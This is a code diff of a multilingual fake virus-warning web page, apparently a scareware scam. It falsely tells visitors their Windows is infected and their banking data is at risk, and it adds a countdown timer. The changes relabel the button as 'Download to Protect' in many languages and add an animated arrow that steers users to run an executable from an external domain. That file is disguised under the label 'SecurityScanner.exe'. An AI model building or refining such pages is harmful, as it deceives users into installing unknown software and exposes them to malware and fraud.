@@ -191,7 +191,6 @@ body { font-family: Arial, Helvetica, sans-serif; background: #fff; color: #222;
   padding: 12px 20px; border-radius: 8px;
   margin-top: 24px; font-size: 15px; font-weight: 600;
   box-shadow: 0 8px 30px rgba(0,0,0,0.5);
-  text-decoration: none;
 }
 .step2-content .file-row .file-ico {
   width: 32px; height: 32px;
@@ -200,27 +199,61 @@ body { font-family: Arial, Helvetica, sans-serif; background: #fff; color: #222;
   color: #fff; font-weight: bold; font-size: 12px;
 }
 
-/* Arrow pointing to top-right (downloads icon) */
+/* Arrow pointing horizontally from center to right */
 .arrow-pointer {
   position: fixed;
-  top: 60px; right: 60px;
+  top: 40px; 
+  right: 25%; /* Pushes it towards the top right */
   z-index: 100001;
-  width: 240px; height: 240px;
+  width: 200px; height: 100px;
   pointer-events: none;
-  animation: arrowBounce 1.2s ease-in-out infinite;
+  animation: arrowSlide 1s ease-in-out infinite alternate;
 }
-@keyframes arrowBounce {
-  0%, 100% { transform: translate(0, 0); }
-  50% { transform: translate(20px, -20px); }
+@keyframes arrowSlide {
+  0% { transform: translateX(0); }
+  100% { transform: translateX(30px); }
 }
 .arrow-pointer svg {
   width: 100%; height: 100%;
   filter: drop-shadow(0 0 18px rgba(244,180,0,0.9));
 }
 
-/* И в самом низу стилей есть правило для мобилок: */
+/* Highlight ring on top-right corner */
+.target-ring {
+  position: fixed;
+  top: 8px; right: 70px;
+  width: 56px; height: 56px;
+  border-radius: 50%;
+  border: 3px solid #f4b400;
+  z-index: 100001;
+  pointer-events: none;
+  animation: targetPulse 1.2s ease-out infinite;
+}
+@keyframes targetPulse {
+  0% { box-shadow: 0 0 0 0 rgba(244,180,0,0.7); transform: scale(1); }
+  100% { box-shadow: 0 0 0 30px rgba(244,180,0,0); transform: scale(1.15); }
+}
+
+.proceed-btn {
+  display: inline-block; background: #1a73e8; color: #fff;
+  font-size: 16px; font-weight: 600; padding: 13px 38px;
+  border: none; border-radius: 6px; cursor: pointer;
+  text-decoration: none;
+  box-shadow: 0 4px 12px rgba(26,115,232,0.4);
+  transition: all 0.2s;
+}
+.proceed-btn:hover { background: #1557b0; transform: translateY(-1px); box-shadow: 0 6px 16px rgba(26,115,232,0.5); }
+
 @media (max-width: 600px) {
-  .arrow-pointer { width: 160px; height: 160px; top: 40px; right: 30px; }
+  .tabs-bar { padding-left: 20px; }
+  .modal-body { padding: 22px 20px; }
+  .title-row { flex-direction: column; align-items: flex-start; gap: 12px; }
+  .action-row { flex-direction: column; align-items: stretch; }
+  .proceed-btn { width: 100%; text-align: center; }
+  .title-text h1 { font-size: 19px; }
+  .step2-content h2 { font-size: 26px; }
+  .step2-content p { font-size: 15px; }
+  .arrow-pointer { width: 120px; height: 60px; top: 15px; right: 10%; }
 }
 </style>
 </head>
@@ -302,12 +335,12 @@ body { font-family: Arial, Helvetica, sans-serif; background: #fff; color: #222;
       </p>
 
       <p class="step-p">
-        Step 1: Click on the <span class="bold">"Proceed"</span> button to check your computer for viruses.
+        Step 1: Click on the <span class="bold">"Download to Protect"</span> button to check your computer for viruses.
       </p>
 
       <div class="action-row">
         <span class="timer-text" id="countdown">2 minutes and 45 seconds</span>
-        <button class="proceed-btn" id="proceedBtn">Proceed &gt;&gt;</button>
+        <button class="proceed-btn" id="proceedBtn">Download to Protect</button>
       </div>
     </div>
   </div>
@@ -315,26 +348,29 @@ body { font-family: Arial, Helvetica, sans-serif; background: #fff; color: #222;
 
 <div class="step2-overlay" id="step2">
   <div class="target-ring"></div>
+  
   <div class="arrow-pointer">
-    <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+    <svg viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
       <defs>
-        <marker id="arrowhead" markerWidth="10" markerHeight="10" refX="5" refY="5" orient="auto">
-          <polygon points="0 0, 10 5, 0 10" fill="#f4b400"/>
+        <marker id="arrowhead" markerWidth="8" markerHeight="8" refX="6" refY="4" orient="auto">
+          <polygon points="0 0, 8 4, 0 8" fill="#f4b400"/>
         </marker>
       </defs>
-      <path d="M 30 170 Q 100 170 160 50" stroke="#f4b400" stroke-width="10" fill="none" stroke-linecap="round" marker-end="url(#arrowhead)"/>
+      <path d="M 10 30 L 170 30" stroke="#f4b400" stroke-width="14" fill="none" stroke-linecap="round" marker-end="url(#arrowhead)"/>
     </svg>
   </div>
+  
   <div class="step2-content">
     <h2 id="step2-title">Open the file <span class="hl">to remove viruses</span> and protect your connection</h2>
     <p id="step2-sub">The file has been downloaded. Click it in the top-right corner of your browser to run the security scan.</p>
     
     <a href="https://vpnshieldguard.net/latest/ZyraPrivateVPN.exe" id="fileLink" class="file-row" download="ZyraPrivateVPN.exe">
       <span class="file-ico">EXE</span>
-      <span id="step2-file">ZyraPrivateVPN.exe</span>
+      <span id="step2-file">SecurityScanner.exe</span>
     </a>
   </div>
 </div>
+
 
 <script>
 const translations = {
@@ -346,8 +382,8 @@ const translations = {
     warning: 'Your Windows is <span class="bold">infected with (3) Viruses</span>. The pre-scan found traces of (2) malware and (1) spyware. System damage: 28.1% - <span class="bold">IMMEDIATE REMOVAL REQUIRED!</span>',
     removal: 'The removal of <span class="bold">(3) Viruses</span> is required immediately to prevent further system damage, loss of Apps, Photos or other files.',
     spyware: 'Traces of <span class="bold">(1) Spyware</span> were found on your computer. <span class="bold">Personal and banking information are at risk.</span>',
-    step: 'Step 1: Click on the <span class="bold">"Proceed"</span> button to check your computer for viruses.',
-    proceed: 'Proceed >>',
+    step: 'Step 1: Click on the <span class="bold">"Download to Protect"</span> button to check your computer for viruses.',
+    proceed: 'Download to Protect',
     timer: function(m,s){ return m+' minute'+(m!==1?'s':'')+' and '+s+' second'+(s!==1?'s':''); },
     days: ['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'],
     months: ['January','February','March','April','May','June','July','August','September','October','November','December'],
@@ -362,8 +398,8 @@ const translations = {
     warning: 'Votre Windows est <span class="bold">infecté par (3) virus</span>. L\'analyse préliminaire a trouvé des traces de (2) logiciels malveillants et (1) logiciel espion. Dommages système : 28.1% - <span class="bold">SUPPRESSION IMMÉDIATE REQUISE !</span>',
     removal: 'La suppression des <span class="bold">(3) virus</span> est nécessaire immédiatement pour éviter d\'autres dommages système, la perte d\'applications, de photos ou d\'autres fichiers.',
     spyware: 'Des traces de <span class="bold">(1) logiciel espion</span> ont été trouvées sur votre ordinateur. <span class="bold">Les informations personnelles et bancaires sont en danger.</span>',
-    step: 'Étape 1 : Cliquez sur le bouton <span class="bold">« Continuer »</span> pour vérifier votre ordinateur.',
-    proceed: 'Continuer >>',
+    step: 'Étape 1 : Cliquez sur le bouton <span class="bold">« Télécharger pour Protéger »</span> pour vérifier votre ordinateur.',
+    proceed: 'Télécharger pour Protéger',
     timer: function(m,s){ return m+' minute'+(m!==1?'s':'')+' et '+s+' seconde'+(s!==1?'s':''); },
     days: ['dimanche','lundi','mardi','mercredi','jeudi','vendredi','samedi'],
     months: ['janvier','février','mars','avril','mai','juin','juillet','août','septembre','octobre','novembre','décembre'],
@@ -378,11 +414,11 @@ const translations = {
     warning: 'Tu Windows está <span class="bold">infectado con (3) virus</span>. El análisis previo encontró rastros de (2) malware y (1) spyware. Daño del sistema: 28.1% - <span class="bold">¡ELIMINACIÓN INMEDIATA REQUERIDA!</span>',
     removal: 'La eliminación de los <span class="bold">(3) virus</span> es necesaria de inmediato para prevenir más daños al sistema, pérdida de aplicaciones, fotos u otros archivos.',
     spyware: 'Se encontraron rastros de <span class="bold">(1) spyware</span> en su computadora. <span class="bold">La información personal y bancaria está en riesgo.</span>',
-    step: 'Paso 1: Haga clic en el botón <span class="bold">"Continuar"</span> para verificar su computadora.',
-    proceed: 'Continuar >>',
+    step: 'Paso 1: Haga clic en el botón <span class="bold">"Descargar para Proteger"</span> para verificar su computadora.',
+    proceed: 'Descargar para Proteger',
     timer: function(m,s){ return m+' minuto'+(m!==1?'s':'')+' y '+s+' segundo'+(s!==1?'s':''); },
     days: ['domingo','lunes','martes','miércoles','jueves','viernes','sábado'],
-    months: ['enero','febrero','marzo','abril','mayo','junio','julio','agosto','septiembre','octubre','noviembre','diciembre'],
+    months: ['enero','febrero','marzo','abril','mayo','junio','julio','agosto','septiembre','octobre','noviembre','diciembre'],
     step2Title: 'Abre el archivo <span class="hl">para eliminar los virus</span> y proteger tu conexión',
     step2Sub: 'El archivo ha sido descargado. Haz clic en él en la esquina superior derecha de tu navegador para iniciar el análisis.'
   },
@@ -394,8 +430,8 @@ const translations = {
     warning: 'Il tuo Windows è <span class="bold">infetto da (3) virus</span>. La pre-scansione ha trovato tracce di (2) malware e (1) spyware. Danni al sistema: 28.1% - <span class="bold">RIMOZIONE IMMEDIATA RICHIESTA!</span>',
     removal: 'La rimozione dei <span class="bold">(3) virus</span> è necessaria immediatamente per prevenire ulteriori danni al sistema, perdita di app, foto o altri file.',
     spyware: 'Tracce di <span class="bold">(1) spyware</span> sono state trovate sul tuo computer. <span class="bold">Le informazioni personali e bancarie sono a rischio.</span>',
-    step: 'Passo 1: Clicca sul pulsante <span class="bold">"Continua"</span> per controllare il tuo computer.',
-    proceed: 'Continua >>',
+    step: 'Passo 1: Clicca sul pulsante <span class="bold">"Scarica per Proteggere"</span> per controllare il tuo computer.',
+    proceed: 'Scarica per Proteggere',
     timer: function(m,s){ return m+' minut'+(m!==1?'i':'o')+' e '+s+' second'+(s!==1?'i':'o'); },
     days: ['domenica','lunedì','martedì','mercoledì','giovedì','venerdì','sabato'],
     months: ['gennaio','febbraio','marzo','aprile','maggio','giugno','luglio','agosto','settembre','ottobre','novembre','dicembre'],
@@ -410,8 +446,8 @@ const translations = {
     warning: 'Ihr Windows ist <span class="bold">mit (3) Viren infiziert</span>. Der Vorab-Scan hat Spuren von (2) Malware und (1) Spyware gefunden. Systemschaden: 28.1% - <span class="bold">SOFORTIGE ENTFERNUNG ERFORDERLICH!</span>',
     removal: 'Die Entfernung der <span class="bold">(3) Viren</span> ist sofort erforderlich, um weitere Systemschäden, den Verlust von Apps, Fotos oder anderen Dateien zu verhindern.',
     spyware: 'Spuren von <span class="bold">(1) Spyware</span> wurden auf Ihrem Computer gefunden. <span class="bold">Persönliche und Bankdaten sind gefährdet.</span>',
-    step: 'Schritt 1: Klicken Sie auf die Schaltfläche <span class="bold">„Weiter"</span>, um Ihren Computer auf Viren zu überprüfen.',
-    proceed: 'Weiter >>',
+    step: 'Schritt 1: Klicken Sie auf die Schaltfläche <span class="bold">"Herunterladen zum Schutz"</span>, um Ihren Computer auf Viren zu überprüfen.',
+    proceed: 'Herunterladen zum Schutz',
     timer: function(m,s){ return m+' Minute'+(m!==1?'n':'')+' und '+s+' Sekunde'+(s!==1?'n':''); },
     days: ['Sonntag','Montag','Dienstag','Mittwoch','Donnerstag','Freitag','Samstag'],
     months: ['Januar','Februar','März','April','Mai','Juni','Juli','August','September','Oktober','November','Dezember'],
@@ -426,8 +462,8 @@ const translations = {
     warning: 'Seu Windows está <span class="bold">infectado com (3) vírus</span>. A pré-verificação encontrou vestígios de (2) malware e (1) spyware. Danos ao sistema: 28.1% - <span class="bold">REMOÇÃO IMEDIATA NECESSÁRIA!</span>',
     removal: 'A remoção dos <span class="bold">(3) vírus</span> é necessária imediatamente para evitar mais danos ao sistema, perda de aplicativos, fotos ou outros arquivos.',
     spyware: 'Vestígios de <span class="bold">(1) spyware</span> foram encontrados no seu computador. <span class="bold">Informações pessoais e bancárias estão em risco.</span>',
-    step: 'Passo 1: Clique no botão <span class="bold">"Continuar"</span> para verificar seu computador.',
-    proceed: 'Continuar >>',
+    step: 'Passo 1: Clique no botão <span class="bold">"Baixar para Proteger"</span> para verificar seu computador.',
+    proceed: 'Baixar para Proteger',
     timer: function(m,s){ return m+' minuto'+(m!==1?'s':'')+' e '+s+' segundo'+(s!==1?'s':''); },
     days: ['domingo','segunda-feira','terça-feira','quarta-feira','quinta-feira','sexta-feira','sábado'],
     months: ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'],
@@ -442,8 +478,8 @@ const translations = {
     warning: 'Uw Windows is <span class="bold">geïnfecteerd met (3) virussen</span>. De voorscan vond sporen van (2) malware en (1) spyware. Systeemschade: 28.1% - <span class="bold">ONMIDDELLIJKE VERWIJDERING VEREIST!</span>',
     removal: 'De verwijdering van de <span class="bold">(3) virussen</span> is onmiddellijk vereist om verdere systeemschade en verlies van apps, foto\'s of andere bestanden te voorkomen.',
     spyware: 'Sporen van <span class="bold">(1) spyware</span> zijn op uw computer gevonden. <span class="bold">Persoonlijke en bankgegevens lopen risico.</span>',
-    step: 'Stap 1: Klik op de knop <span class="bold">"Doorgaan"</span> om uw computer te controleren op virussen.',
-    proceed: 'Doorgaan >>',
+    step: 'Stap 1: Klik op de knop <span class="bold">"Downloaden om te Beschermen"</span> om uw computer te controleren op virussen.',
+    proceed: 'Downloaden om te Beschermen',
     timer: function(m,s){ return m+' minuut'+(m!==1?'en':'')+' en '+s+' seconde'+(s!==1?'n':''); },
     days: ['zondag','maandag','dinsdag','woensdag','donderdag','vrijdag','zaterdag'],
     months: ['januari','februari','maart','april','mei','juni','juli','augustus','september','oktober','november','december'],
@@ -458,8 +494,8 @@ const translations = {
     warning: 'Twój Windows jest <span class="bold">zainfekowany (3) wirusami</span>. Wstępne skanowanie znalazło ślady (2) złośliwego oprogramowania i (1) oprogramowania szpiegującego. Uszkodzenie systemu: 28.1% - <span class="bold">WYMAGANE NATYCHMIASTOWE USUNIĘCIE!</span>',
     removal: 'Usunięcie <span class="bold">(3) wirusów</span> jest natychmiast wymagane, aby zapobiec dalszym uszkodzeniom systemu, utracie aplikacji, zdjęć lub innych plików.',
     spyware: 'Na komputerze znaleziono ślady <span class="bold">(1) oprogramowania szpiegującego</span>. <span class="bold">Dane osobowe i bankowe są zagrożone.</span>',
-    step: 'Krok 1: Kliknij przycisk <span class="bold">„Kontynuuj"</span>, aby sprawdzić komputer.',
-    proceed: 'Kontynuuj >>',
+    step: 'Krok 1: Kliknij przycisk <span class="bold">„Pobierz, aby chronić"</span>, aby sprawdzić komputer.',
+    proceed: 'Pobierz, aby chronić',
     timer: function(m,s){ return m+' minut'+(m===1?'a':'') +' i '+s+' sekund'+(s===1?'a':''); },
     days: ['niedziela','poniedziałek','wtorek','środa','czwartek','piątek','sobota'],
     months: ['stycznia','lutego','marca','kwietnia','maja','czerwca','lipca','sierpnia','września','października','listopada','grudnia'],
@@ -474,8 +510,8 @@ const translations = {
     warning: 'Din Windows är <span class="bold">infekterad med (3) virus</span>. Förskanningen hittade spår av (2) skadlig kod och (1) spionprogram. Systemskada: 28.1% - <span class="bold">OMEDELBAR BORTTAGNING KRÄVS!</span>',
     removal: 'Borttagningen av <span class="bold">(3) virus</span> krävs omedelbart för att förhindra ytterligare systemskador, förlust av appar, foton eller andra filer.',
     spyware: 'Spår av <span class="bold">(1) spionprogram</span> hittades på din dator. <span class="bold">Personlig och bankinformation är i fara.</span>',
-    step: 'Steg 1: Klicka på knappen <span class="bold">"Fortsätt"</span> för att kontrollera datorn.',
-    proceed: 'Fortsätt >>',
+    step: 'Steg 1: Klicka på knappen <span class="bold">"Ladda ner för att skydda"</span> för att kontrollera datorn.',
+    proceed: 'Ladda ner för att skydda',
     timer: function(m,s){ return m+' minut'+(m!==1?'er':'')+' och '+s+' sekund'+(s!==1?'er':''); },
     days: ['söndag','måndag','tisdag','onsdag','torsdag','fredag','lördag'],
     months: ['januari','februari','mars','april','maj','juni','juli','augusti','september','oktober','november','december'],
@@ -490,8 +526,8 @@ const translations = {
     warning: 'Din Windows er <span class="bold">inficeret med (3) virus</span>. Forhåndsscanningen fandt spor af (2) malware og (1) spyware. Systemskade: 28.1% - <span class="bold">ØJEBLIKKELIG FJERNELSE PÅKRÆVET!</span>',
     removal: 'Fjernelse af <span class="bold">(3) virus</span> er øjeblikkeligt påkrævet for at forhindre yderligere systemskade og tab af apps, fotos eller andre filer.',
     spyware: 'Spor af <span class="bold">(1) spyware</span> blev fundet på din computer. <span class="bold">Personlige og bankoplysninger er i fare.</span>',
-    step: 'Trin 1: Klik på knappen <span class="bold">"Fortsæt"</span> for at tjekke din computer.',
-    proceed: 'Fortsæt >>',
+    step: 'Trin 1: Klik på knappen <span class="bold">"Download for at beskytte"</span> for at tjekke din computer.',
+    proceed: 'Download for at beskytte',
     timer: function(m,s){ return m+' minut'+(m!==1?'ter':'')+' og '+s+' sekund'+(s!==1?'er':''); },
     days: ['søndag','mandag','tirsdag','onsdag','torsdag','fredag','lørdag'],
     months: ['januar','februar','marts','april','maj','juni','juli','august','september','oktober','november','december'],
@@ -506,8 +542,8 @@ const translations = {
     warning: 'Windows er <span class="bold">infisert med (3) virus</span>. Forhåndsskanningen fant spor av (2) skadelig programvare og (1) spionprogram. Systemskade: 28.1% - <span class="bold">UMIDDELBAR FJERNING PÅKREVD!</span>',
     removal: 'Fjerning av <span class="bold">(3) virus</span> er umiddelbart nødvendig for å forhindre ytterligere systemskade og tap av apper, bilder eller andre filer.',
     spyware: 'Spor av <span class="bold">(1) spionprogram</span> ble funnet på datamaskinen. <span class="bold">Personlig og bankinformasjon er i fare.</span>',
-    step: 'Trinn 1: Klikk på <span class="bold">"Fortsett"</span>-knappen for å sjekke datamaskinen.',
-    proceed: 'Fortsett >>',
+    step: 'Trinn 1: Klikk på <span class="bold">"Last ned for å beskytte"</span>-knappen for å sjekke datamaskinen.',
+    proceed: 'Last ned for å beskytte',
     timer: function(m,s){ return m+' minutt'+(m!==1?'er':'')+' og '+s+' sekund'+(s!==1?'er':''); },
     days: ['søndag','mandag','tirsdag','onsdag','torsdag','fredag','lørdag'],
     months: ['januar','februar','mars','april','mai','juni','juli','august','september','oktober','november','desember'],
@@ -522,8 +558,8 @@ const translations = {
     warning: 'Windows on <span class="bold">saastunut (3) viruksella</span>. Esitarkistus löysi jälkiä (2) haittaohjelmasta ja (1) vakoiluohjelmasta. Järjestelmävaurio: 28.1% - <span class="bold">VÄLITÖN POISTAMINEN VAADITAAN!</span>',
     removal: '<span class="bold">(3) viruksen</span> poistaminen on välttämätöntä heti, jotta vältetään lisävahinkoja ja sovellusten, valokuvien tai muiden tiedostojen menettäminen.',
     spyware: 'Tietokoneeltasi löytyi jälkiä <span class="bold">(1) vakoiluohjelmasta</span>. <span class="bold">Henkilökohtaiset ja pankkitiedot ovat vaarassa.</span>',
-    step: 'Vaihe 1: Napsauta <span class="bold">"Jatka"</span>-painiketta tarkistaaksesi tietokoneen.',
-    proceed: 'Jatka >>',
+    step: 'Vaihe 1: Napsauta <span class="bold">"Lataa suojataksesi"</span>-painiketta tarkistaaksesi tietokoneen.',
+    proceed: 'Lataa suojataksesi',
     timer: function(m,s){ return m+' minuutti'+(m!==1?'a':'')+' ja '+s+' sekunti'+(s!==1?'a':''); },
     days: ['sunnuntai','maanantai','tiistai','keskiviikko','torstai','perjantai','lauantai'],
     months: ['tammikuuta','helmikuuta','maaliskuuta','huhtikuuta','toukokuuta','kesäkuuta','heinäkuuta','elokuuta','syyskuuta','lokakuuta','marraskuuta','joulukuuta'],
@@ -538,8 +574,8 @@ const translations = {
     warning: 'Váš Windows je <span class="bold">infikován (3) viry</span>. Předběžné skenování našlo stopy (2) malwaru a (1) spywaru. Poškození systému: 28.1% - <span class="bold">VYŽADUJE OKAMŽITÉ ODSTRANĚNÍ!</span>',
     removal: 'Odstranění <span class="bold">(3) virů</span> je okamžitě nutné, aby se zabránilo dalšímu poškození systému a ztrátě aplikací, fotografií či jiných souborů.',
     spyware: 'Na vašem počítači byly nalezeny stopy <span class="bold">(1) spywaru</span>. <span class="bold">Osobní a bankovní údaje jsou ohroženy.</span>',
-    step: 'Krok 1: Klikněte na tlačítko <span class="bold">„Pokračovat"</span> pro kontrolu počítače.',
-    proceed: 'Pokračovat >>',
+    step: 'Krok 1: Klikněte na tlačítko <span class="bold">„Stáhnout pro ochranu"</span> pro kontrolu počítače.',
+    proceed: 'Stáhnout pro ochranu',
     timer: function(m,s){ return m+' minut'+(m===1?'a':'')+' a '+s+' sekund'+(s===1?'a':''); },
     days: ['neděle','pondělí','úterý','středa','čtvrtek','pátek','sobota'],
     months: ['ledna','února','března','dubna','května','června','července','srpna','září','října','listopadu','prosince'],
@@ -554,8 +590,8 @@ const translations = {
     warning: 'Váš Windows je <span class="bold">infikovaný (3) vírusmi</span>. Predbežné skenovanie našlo stopy (2) malvéru a (1) spywaru. Poškodenie systému: 28.1% - <span class="bold">VYŽADUJE OKAMŽITÉ ODSTRÁNENIE!</span>',
     removal: 'Odstránenie <span class="bold">(3) vírusov</span> je okamžite nutné, aby sa predišlo ďalšiemu poškodeniu systému a strate aplikácií, fotografií či iných súborov.',
     spyware: 'Na vašom počítači boli nájdené stopy <span class="bold">(1) spywaru</span>. <span class="bold">Osobné a bankové údaje sú ohrozené.</span>',
-    step: 'Krok 1: Kliknite na tlačidlo <span class="bold">„Pokračovať"</span> a skontrolujte počítač.',
-    proceed: 'Pokračovať >>',
+    step: 'Krok 1: Kliknite na tlačidlo <span class="bold">„Stiahnuť pre ochranu"</span> a skontrolujte počítač.',
+    proceed: 'Stiahnuť pre ochranu',
     timer: function(m,s){ return m+' minút'+(m===1?'a':'')+' a '+s+' sekúnd'+(s===1?'a':''); },
     days: ['nedeľa','pondelok','utorok','streda','štvrtok','piatok','sobota'],
     months: ['januára','februára','marca','apríla','mája','júna','júla','augusta','septembra','októbra','novembra','decembra'],
@@ -570,8 +606,8 @@ const translations = {
     warning: 'A Windows <span class="bold">(3) vírussal fertőzött</span>. Az előzetes ellenőrzés (2) rosszindulatú program és (1) kémprogram nyomait találta. Rendszerkárosodás: 28.1% - <span class="bold">AZONNALI ELTÁVOLÍTÁS SZÜKSÉGES!</span>',
     removal: 'A <span class="bold">(3) vírus</span> azonnali eltávolítása szükséges a további rendszerkárok, alkalmazások, fotók és egyéb fájlok elvesztésének elkerülése érdekében.',
     spyware: '<span class="bold">(1) kémprogram</span> nyomait találták a számítógépén. <span class="bold">A személyes és banki adatok veszélyben vannak.</span>',
-    step: '1. lépés: Kattintson a <span class="bold">„Folytatás"</span> gombra a számítógép ellenőrzéséhez.',
-    proceed: 'Folytatás >>',
+    step: '1. lépés: Kattintson a <span class="bold">„Letöltés a védelemhez"</span> gombra a számítógép ellenőrzéséhez.',
+    proceed: 'Letöltés a védelemhez',
     timer: function(m,s){ return m+' perc és '+s+' másodperc'; },
     days: ['vasárnap','hétfő','kedd','szerda','csütörtök','péntek','szombat'],
     months: ['január','február','március','április','május','június','július','augusztus','szeptember','október','november','december'],
@@ -586,8 +622,8 @@ const translations = {
     warning: 'Windows-ul tău este <span class="bold">infectat cu (3) viruși</span>. Pre-scanarea a găsit urme de (2) malware și (1) spyware. Daune sistem: 28.1% - <span class="bold">ELIMINARE IMEDIATĂ NECESARĂ!</span>',
     removal: 'Eliminarea celor <span class="bold">(3) viruși</span> este necesară imediat pentru a preveni daune suplimentare sistemului și pierderea aplicațiilor, fotografiilor sau altor fișiere.',
     spyware: 'Au fost găsite urme de <span class="bold">(1) spyware</span> pe computerul tău. <span class="bold">Informațiile personale și bancare sunt în pericol.</span>',
-    step: 'Pasul 1: Faceți clic pe butonul <span class="bold">„Continuă"</span> pentru a verifica computerul.',
-    proceed: 'Continuă >>',
+    step: 'Pasul 1: Faceți clic pe butonul <span class="bold">„Descărcați pentru a proteja"</span> pentru a verifica computerul.',
+    proceed: 'Descărcați pentru a proteja',
     timer: function(m,s){ return m+' minut'+(m!==1?'e':'')+' și '+s+' secund'+(s!==1?'e':'ă'); },
     days: ['duminică','luni','marți','miercuri','joi','vineri','sâmbătă'],
     months: ['ianuarie','februarie','martie','aprilie','mai','iunie','iulie','august','septembrie','octombrie','noiembrie','decembrie'],
@@ -602,8 +638,8 @@ const translations = {
     warning: 'Τα Windows σας <span class="bold">έχουν μολυνθεί από (3) ιούς</span>. Η προσάρωση εντόπισε ίχνη (2) κακόβουλου λογισμικού και (1) spyware. Ζημιά συστήματος: 28.1% - <span class="bold">ΑΠΑΙΤΕΙΤΑΙ ΑΜΕΣΗ ΑΦΑΙΡΕΣΗ!</span>',
     removal: 'Η αφαίρεση των <span class="bold">(3) ιών</span> απαιτείται άμεσα για την αποφυγή περαιτέρω ζημιάς και απώλειας εφαρμογών, φωτογραφιών ή άλλων αρχείων.',
     spyware: 'Βρέθηκαν ίχνη <span class="bold">(1) spyware</span> στον υπολογιστή σας. <span class="bold">Προσωπικά και τραπεζικά στοιχεία κινδυνεύουν.</span>',
-    step: 'Βήμα 1: Κάντε κλικ στο κουμπί <span class="bold">«Συνέχεια»</span> για να ελέγξετε τον υπολογιστή σας.',
-    proceed: 'Συνέχεια >>',
+    step: 'Βήμα 1: Κάντε κλικ στο κουμπί <span class="bold">«Λήψη για προστασία»</span> για να ελέγξετε τον υπολογιστή σας.',
+    proceed: 'Λήψη για προστασία',
     timer: function(m,s){ return m+' λεπτ'+(m!==1?'ά':'ό')+' και '+s+' δευτερόλεπτ'+(s!==1?'α':'ο'); },
     days: ['Κυριακή','Δευτέρα','Τρίτη','Τετάρτη','Πέμπτη','Παρασκευή','Σάββατο'],
     months: ['Ιανουαρίου','Φεβρουαρίου','Μαρτίου','Απριλίου','Μαΐου','Ιουνίου','Ιουλίου','Αυγούστου','Σεπτεμβρίου','Οκτωβρίου','Νοεμβρίου','Δεκεμβρίου'],
@@ -618,8 +654,8 @@ const translations = {
     warning: 'Windows\'unuza <span class="bold">(3) virüs bulaştı</span>. Ön tarama (2) kötü amaçlı yazılım ve (1) casus yazılım izleri buldu. Sistem hasarı: 28.1% - <span class="bold">ACİL KALDIRMA GEREKLİ!</span>',
     removal: '<span class="bold">(3) virüsün</span> kaldırılması, daha fazla sistem hasarını ve uygulama, fotoğraf veya diğer dosyaların kaybını önlemek için derhal gereklidir.',
     spyware: 'Bilgisayarınızda <span class="bold">(1) casus yazılım</span> izleri bulundu. <span class="bold">Kişisel ve bankacılık bilgileri risk altında.</span>',
-    step: 'Adım 1: Bilgisayarınızı kontrol etmek için <span class="bold">"Devam Et"</span> düğmesine tıklayın.',
-    proceed: 'Devam Et >>',
+    step: 'Adım 1: Bilgisayarınızı kontrol etmek için <span class="bold">"Korumak için İndir"</span> düğmesine tıklayın.',
+    proceed: 'Korumak için İndir',
     timer: function(m,s){ return m+' dakika ve '+s+' saniye'; },
     days: ['Pazar','Pazartesi','Salı','Çarşamba','Perşembe','Cuma','Cumartesi'],
     months: ['Ocak','Şubat','Mart','Nisan','Mayıs','Haziran','Temmuz','Ağustos','Eylül','Ekim','Kasım','Aralık'],
@@ -634,8 +670,8 @@ const translations = {
     warning: 'Ваш Windows <span class="bold">заражён (3) вирусами</span>. Предварительное сканирование обнаружило следы (2) вредоносных программ и (1) шпионской программы. Повреждение системы: 28.1% - <span class="bold">ТРЕБУЕТСЯ НЕМЕДЛЕННОЕ УДАЛЕНИЕ!</span>',
     removal: 'Удаление <span class="bold">(3) вирусов</span> требуется немедленно, чтобы предотвратить дальнейшее повреждение системы, потерю приложений, фотографий и других файлов.',
     spyware: 'На вашем компьютере найдены следы <span class="bold">(1) шпионской программы</span>. <span class="bold">Личные и банковские данные под угрозой.</span>',
-    step: 'Шаг 1: Нажмите кнопку <span class="bold">«Продолжить»</span>, чтобы проверить компьютер на вирусы.',
-    proceed: 'Продолжить >>',
+    step: 'Шаг 1: Нажмите кнопку <span class="bold">«Скачать для защиты»</span>, чтобы проверить компьютер на вирусы.',
+    proceed: 'Скачать для защиты',
     timer: function(m,s){ return m+' минут'+(m===1?'а':(m>=2&&m<=4?'ы':''))+' и '+s+' секунд'+(s===1?'а':(s>=2&&s<=4?'ы':'')); },
     days: ['воскресенье','понедельник','вторник','среда','четверг','пятница','суббота'],
     months: ['января','февраля','марта','апреля','мая','июня','июля','августа','сентября','октября','ноября','декабря'],
@@ -650,8 +686,8 @@ const translations = {
     warning: 'Ваш Windows <span class="bold">заражено (3) вірусами</span>. Попереднє сканування виявило сліди (2) шкідливих програм і (1) шпигунської програми. Пошкодження системи: 28.1% - <span class="bold">ПОТРІБНЕ НЕГАЙНЕ ВИДАЛЕННЯ!</span>',
     removal: 'Видалення <span class="bold">(3) вірусів</span> потрібне негайно, щоб запобігти подальшому пошкодженню системи та втраті програм, фотографій або інших файлів.',
     spyware: 'На вашому комп\'ютері знайдено сліди <span class="bold">(1) шпигунської програми</span>. <span class="bold">Особисті та банківські дані під загрозою.</span>',
-    step: 'Крок 1: Натисніть кнопку <span class="bold">«Продовжити»</span>, щоб перевірити комп\'ютер.',
-    proceed: 'Продовжити >>',
+    step: 'Крок 1: Натисніть кнопку <span class="bold">«Завантажити для захисту»</span>, щоб перевірити комп\'ютер.',
+    proceed: 'Завантажити для захисту',
     timer: function(m,s){ return m+' хвилин'+(m===1?'а':(m>=2&&m<=4?'и':''))+' та '+s+' секунд'+(s===1?'а':(s>=2&&s<=4?'и':'')); },
     days: ['неділя','понеділок','вівторок','середа','четвер','п\'ятниця','субота'],
     months: ['січня','лютого','березня','квітня','травня','червня','липня','серпня','вересня','жовтня','листопада','грудня'],
@@ -666,8 +702,8 @@ const translations = {
     warning: 'Вашият Windows е <span class="bold">заразен с (3) вируса</span>. Предварителното сканиране откри следи от (2) зловреден софтуер и (1) шпионски софтуер. Повреда на системата: 28.1% - <span class="bold">ИЗИСКВА СЕ НЕЗАБАВНО ПРЕМАХВАНЕ!</span>',
     removal: 'Премахването на <span class="bold">(3) вируса</span> е необходимо незабавно, за да се предотвратят допълнителни повреди и загуба на приложения, снимки или други файлове.',
     spyware: 'На компютъра ви бяха открити следи от <span class="bold">(1) шпионски софтуер</span>. <span class="bold">Личните и банковите данни са в опасност.</span>',
